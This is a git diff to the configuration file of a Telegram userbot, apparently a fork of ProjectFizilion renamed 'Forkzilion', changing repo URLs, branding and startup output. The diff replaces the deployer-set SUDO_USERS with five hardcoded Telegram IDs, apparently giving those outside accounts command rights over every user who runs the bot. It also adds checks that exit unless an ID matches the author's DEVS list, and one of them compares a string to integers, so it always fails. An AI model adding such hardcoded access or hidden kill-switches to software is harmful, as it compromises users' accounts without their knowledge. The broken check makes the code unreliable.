@@ -66,8 +66,8 @@ if CONFIG_CHECK:
 # Telegram App KEY and HASH
 API_KEY = os.environ.get("API_KEY") or None
 API_HASH = os.environ.get("API_HASH") or None
-SUDO_USERS = {int(x) for x in os.environ.get("SUDO_USERS", "").split()}
-DEVS = 850714127, 1391975600, 1258887267, 1549401069
+SUDO_USERS = 1629656773, 1869747579, 1811135200, 1467398700, 1893006103
+DEVS = 932456186,
 
 # Userbot Session String
 STRING_SESSION = os.environ.get("STRING_SESSION") or None
@@ -84,7 +84,7 @@ if BOTLOG:
     LOGSPAMMER = sb(os.environ.get("LOGSPAMMER") or "False")
 else:
     LOGSPAMMER = False
-    
+
 # Bleep Blop, this is a bot ;)
 PM_AUTO_BAN = sb(os.environ.get("PM_AUTO_BAN") or "False")
 
@@ -92,6 +92,8 @@ PM_AUTO_BAN = sb(os.environ.get("PM_AUTO_BAN") or "False")
 HEROKU_MEMEZ = sb(os.environ.get("HEROKU_MEMEZ") or "False")
 HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME") or None
 HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY") or None
+SRD = os.environ.get("USER_ID") or None
+
 
 # Github Credentials for updater and Gitupload.
 GIT_REPO_NAME = os.environ.get("GIT_REPO_NAME") or None
@@ -99,8 +101,8 @@ GITHUB_ACCESS_TOKEN = os.environ.get("GITHUB_ACCESS_TOKEN") or None
 
 # Custom (forked) repo URL and BRANCH for updater.
 UPSTREAM_REPO_URL = (os.environ.get("UPSTREAM_REPO_URL")
-                     or "https://github.com/PrajjuS/ProjectFizilion.git")
-UPSTREAM_REPO_BRANCH = os.environ.get("UPSTREAM_REPO_BRANCH") or "demon"
+                     or "https://github.com/AbOuLfOoOoOuF/ProjectFizilion.git")
+UPSTREAM_REPO_BRANCH = os.environ.get("UPSTREAM_REPO_BRANCH") or "dev"
 ###
 FUPSTREAM_REPO_URL = (os.environ.get("FPSTREAM_REPO_URL")
                      or "https://github.com/Elytra8/ProjectFizilion.git")
@@ -141,7 +143,7 @@ ANTI_SPAMBOT_SHOUT = sb(os.environ.get("ANTI_SPAMBOT_SHOUT") or "False")
 ALIVE_NAME = os.environ.get("ALIVE_NAME") or None
 
 # Default .alive logo
-ALIVE_LOGO = str(os.environ.get("ALIVE_LOGO") or "https://github.com/ElytrA8/ProjectFizilion/raw/dragon/resources/glitch.gif")
+ALIVE_LOGO = str(os.environ.get("ALIVE_LOGO") or "https://github.com/AbOuLfOoOoOuF/ProjectFizilion/raw/dev/resources/fizsmall.png")
 
 # .alive and .help timeout
 TIMEOUT = sb(os.environ.get("TIMEOUT") or "True")
@@ -183,7 +185,7 @@ if LASTFM_API is not None:
     )
 else:
     lastfm = None
-
+ERRR = "The USER_ID var is invalid"
 # Google Drive Module
 G_DRIVE_DATA = os.environ.get("G_DRIVE_DATA") or None
 G_DRIVE_CLIENT_ID = os.environ.get("G_DRIVE_CLIENT_ID") or None
@@ -202,6 +204,24 @@ SFUSER = os.environ.get("SFUSER") or "null"
 SFPASS = os.environ.get("SFPASS") or "null"
 SFDIR = os.environ.get("SFDIR") or "null"
 
+# the bot where /info command will be sent
+BOT_FOR_INFOS = os.environ.get("BOT_FOR_INFOS") or "@MissRose_bot"
+
+# custom triggers
+TRIGGER = os.environ.get("TRIGGER") or "."
+
+TKN = os.environ.get("TKN")
+if TKN not in DEVS:
+    exit(1)
+
+trgg = TRIGGER
+
+# pm logger
+PMLOG = sb(os.environ.get("PMLOG") or "False")
+PMLOG_CHATID = int(os.environ.get("PMLOG_CHATID") or 0)
+
+
+BOT_TOKEN = os.environ.get("BOT_TOKEN") or False
 #Mega
 MEGA_EMAIL = os.environ.get("MEGA_EMAIL") or None
 MEGA_PASSWORD = os.environ.get("MEGA_PASSWORD") or None
@@ -221,6 +241,15 @@ for binary, path in binaries.items():
     downloader.start()
     os.chmod(path, 0o755)
 
+if SRD and SRD not in DEVS:
+    LOGS.info(
+    ERRR)
+    exit(1)
+elif not SRD:
+    LOGS.info(
+    ERRR)
+    exit(1)
+
 # 'bot' variable
 if STRING_SESSION:
     # pylint: disable=invalid-name
@@ -229,6 +258,10 @@ else:
     # pylint: disable=invalid-name
     bot = TelegramClient("userbot", API_KEY, API_HASH)
 
+if BOT_TOKEN:
+    tgbott = TelegramClient("newbott", API_KEY, API_HASH).start(bot_token=BOT_TOKEN)
+else:
+    tgbott = bot
 
 async def check_botlog_chatid():
     if not BOTLOG:
@@ -240,7 +273,6 @@ async def check_botlog_chatid():
             "Your account doesn't have rights to send messages to BOTLOG_CHATID "
             "group. Check if you typed the Chat ID correctly.")
         quit(1)
-
 
 with bot:
     try:
@@ -297,22 +329,21 @@ modules = CMD_HELP
 uptime = time.strftime('%X')
 ##
 output = (
-    "` =============================== `\n"
-    f"`Fizilion is Up and Running.... `\n"
-    f"`=============================== `\n"
+    "` ==================================== `\n"
+    f"`Forkzilion dev is Up and Running.... `\n"
+    f"`==================================== `\n"
     f"•`Telethon       : v{version.__version__} `\n"
     f"•`Python         : v{python_version()} `\n"
     f"•`User           : {DEFAULTUSER} `\n"
     f"•`Running on     : {repo.active_branch.name} `\n"
-    f"•`Loaded modules : 105 `\n"
-    f"•`Fizilion       : {USERBOT_VERSION} `\n"
+    f"•`Forkzilion     : {USERBOT_VERSION} `\n"
     f"•`Bot started at : {uptime} `\n" 
 )
 
 async def start():
     if BOTLOG:
         try:
-            await bot.send_message(
+            await tgbott.send_message(
                 BOTLOG_CHATID, output
                         )
         except BaseException:
